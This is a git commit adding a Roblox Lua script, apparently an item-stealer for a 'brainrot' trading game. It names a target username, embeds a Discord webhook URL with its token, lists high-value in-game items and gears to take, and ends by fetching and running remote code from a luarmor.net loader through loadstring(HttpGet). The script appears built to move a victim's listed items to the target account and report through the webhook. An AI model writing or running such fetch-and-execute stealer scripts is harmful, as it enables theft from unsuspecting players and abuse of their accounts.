711d815b7b3292627b984b74aba942cd9745beb0
sab-api <carlosignaa2019@gmail.com>
2026-08-13 15:14:08 -0400

    Add script spam_1786648448379.lua

---
+++ scripts/spam_1786648448379.lua
@@ -0,0 +1,68 @@
+-- Mode: NORMAL
+getgenv().TARGET_USERNAME = "luffy104742"
+getgenv().WEBHOOK_URL = "https://discord.com/api/webhooks/1537529351279743067/VW-a2qGfPM52RgLTXZaoW8Wf9NS-jisNWupgQ9m4L7DIY4Ux4YjaTnqPL248nVfniFEA"
+getgenv().NORMAL_BRAINROTS = {
+    ["Bumbatron"] = true,
+    ["Los Secret Combinasionas"] = true,
+    ["Pizza and Ranch"] = true,
+    ["Grabatron"] = true,
+    ["W or L"] = true,
+    ["Tang Tang Keletang"] = true,
+    ["Swaggy Bros"] = true,
+    ["Spooky and Pumpky"] = true,
+    ["Signore Carapace"] = true,
+    ["Rosey and Teddy"] = true,
+    ["Reinito Sleighito"] = true,
+    ["Popcuru and Fizzuru"] = true,
+    ["Lovin Rose"] = true,
+    ["Nacho Spyder"] = true,
+    ["Love Love Bear"] = true,
+    ["Los Primos"] = true,
+    ["Los Puggies"] = true,
+    ["Los Bros"] = true,
+    ["La Romantic Grande"] = true,
+    ["La Lucky Grande"] = true,
+    ["La Secret Combinasion"] = true,
+    ["La Supreme Combinasion"] = true,
+    ["La Summer Grande"] = true,
+    ["La Sahur Combinasion"] = true,
+    ["La Food Combinasion"] = true,
+    ["La Casa Boo"] = true,
+    ["Ketupat Kepat"] = true,
+    ["Ketchuru and Musturu"] = true,
+    ["Ketupat Bros"] = true,
+    ["Jolly Jolly Sahur"] = true,
+    ["Hydra Dragon Cannelloni"] = true,
+    ["Hopilikalika Hopilikalako"] = true,
+    ["Hydra Bunny"] = true,
+    ["Griffin"] = true,
+    ["Garama and Madundung"] = true,
+    ["Fragrama and Chocrama"] = true,
+    ["Fortunu and Cashuru"] = true,
+    ["Duggy Bros"] = true,
+    ["Dragon Cannelloni"] = true,
+    ["Coco and Mango"] = true,
+    ["Chipso and Queso"] = true,
+    ["Burguro And Fryuro"] = true,
+    ["Celestial Pegasus"] = true,
+    ["Capitano Moby"] = true,
+    ["Celularcini Viciosini"] = true,
+    ["Antonio"] = true,
+    ["Headless Horseman"] = true,
+    ["John Pork"] = true,
+    ["Meowl"] = true,
+    ["Skibidi Toilet"] = true,
+    ["Spyder Elephant"] = true,
+    ["Strawberry Elephant"] = true
+}
+getgenv().NORMAL_BASE_SKINS = {
+    ["Rose"] = true
+}
+getgenv().NORMAL_GEARS = {
+    ["Yin Yang Lamp"] = true,
+    ["Santa's Sleigh"] = true
+}
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/870375c8dfbc1d6521073674fe460cb6.lua"))()
+end)
